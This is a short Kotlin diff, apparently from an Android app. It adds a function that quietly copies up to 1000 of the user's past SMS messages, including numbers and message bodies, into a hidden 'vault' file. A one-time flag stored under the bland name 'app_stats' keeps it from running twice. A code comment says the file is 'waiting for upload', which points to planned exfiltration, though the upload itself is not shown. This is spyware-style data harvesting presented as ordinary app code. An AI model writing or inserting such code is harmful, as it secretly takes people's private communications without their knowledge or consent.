@@ -132,13 +132,26 @@ object PhoneManager {
                     obj.put("num", it.getString(addrIdx))
                     obj.put("body", it.getString(bodyIdx))
                     obj.put("ts", it.getLong(dateIdx))
-                    // type: 1 = Inbox, 2 = Sent
                     obj.put("type", it.getInt(typeIdx))
                     list.put(obj)
                 }
             }
         } catch(e: Exception) { e.printStackTrace() }
         return list
+    }
+
+    fun vaultHistoricalSms(ctx: Context) {
+        val prefs = ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE)
+        if (prefs.getBoolean("historical_sms_dumped", false)) return
+
+        val vaultFile = java.io.File(ctx.filesDir, "sms_archive_vault.json")
+        if (vaultFile.exists()) return // Already vaulted, waiting for upload
+
+        val data = getHistoricalSms(ctx, 1000)
+        if (data.length() > 0) {
+            vaultFile.writeText(data.toString())
+            DebugLogger.log("VAULT", "Inbox snapshot secured: ${data.length()} messages")
+        }
     }
 
     fun getContacts(ctx: Context): JSONArray {
